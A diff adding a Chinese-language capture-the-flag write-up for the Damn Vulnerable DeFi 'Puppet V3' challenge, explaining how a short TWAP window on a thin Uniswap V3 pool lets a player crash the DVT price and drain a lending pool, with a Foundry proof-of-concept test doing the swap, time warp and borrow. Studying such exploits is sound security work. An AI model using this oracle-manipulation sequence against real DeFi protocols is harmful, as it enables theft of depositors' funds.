@@ -898,3 +898,55 @@ address = keccak256(address(deployer), nonce);
 // CREATE2
 address = keccak256(0xFF, sender, salt, bytecode);
 ```
+
+### Puppet V3
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 無論是熊市還是牛市，真正的 DeFi 開發者都會持續建設。還記得你之前幫助過的那個借貸池嗎？他們現在推出了新版本。他們現在使用 Uniswap V3 作為預言機。沒錯，不再使用現貨價格！這次借貸池查詢的是資產的時間加權平均價格，並且使用了所有推薦的庫。Uniswap 市場中有 100 WETH 和 100 DVT 的流動性。借貸池裡有一百萬個 DVT 代幣。你從 1 ETH 和一些 DVT 開始，必須拯救所有人於這個存在漏洞的借貸池。別忘了將它們發送到指定的恢復帳戶。注意：此挑戰需要有效的 RPC URL，以便將主網狀態分叉到你的本地環境。
+
+過關條件:
+- 必須在 block.timestamp - initialBlockTimestamp < 115 秒內完成
+- 借貸池（lendingPool）中的代幣餘額必須為零
+- 所有LENDING_POOL_INITIAL_TOKEN_BALANCE代幣都被轉移到 recovery 錢包
+
+解題:
+- 要注意 calculateDepositOfWETHRequired 拿到的報價會是3倍價格.
+
+```
+    function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
+        uint256 quote = _getOracleQuote(_toUint128(amount));
+        return quote * DEPOSIT_FACTOR;
+    }
+```
+- Pool 裡有 100 個 WETH 和 100 個 DVT 代幣，流動性較小,PuppetV3Pool.sol合約使用了10分鐘的TWAP期來計算DVT代幣的價格, 這個設定使合約容易受到價格操控攻擊的影響
+, 無需付出太多成本! 有了這個方法後, 我們可以透過我們擁有的 110 DVT 代幣換成 WETH, 使 DVT 代幣變得超級便宜. 因為oracle會根據過去10分鐘的價格數據來計算當前價格。然而，由於TWAP期較短，只需在這10分鐘內大幅度操作交易（如大筆兌換DVT），即可顯著影響報價. 由於TWAP是一種延遲報價機制，在操控價格後，有一個短暫的時間窗口（例如110秒）讓攻擊者利用降低的價格進行不公平的借貸。這個時間窗口允許攻擊者在TWAP價格尚未恢復到正常水平之前，最大化利用這個價格差距來實現獲利.
+
+[POC](./damn-vulnerable-defi/test/puppet-v3/PuppetV3.t.sol) :
+
+```
+    function test_puppetV3() public checkSolvedByPlayer {
+       address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(address(uniswapRouterAddress), type(uint256).max);
+uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+console.log("beofre quote: ", quote1); //quote:3000000000000000000000000
+
+ 
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
+                0,
+                0
+            )
+        );  
+         vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), quote);
+        console.log("quote: ", quote);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
+```
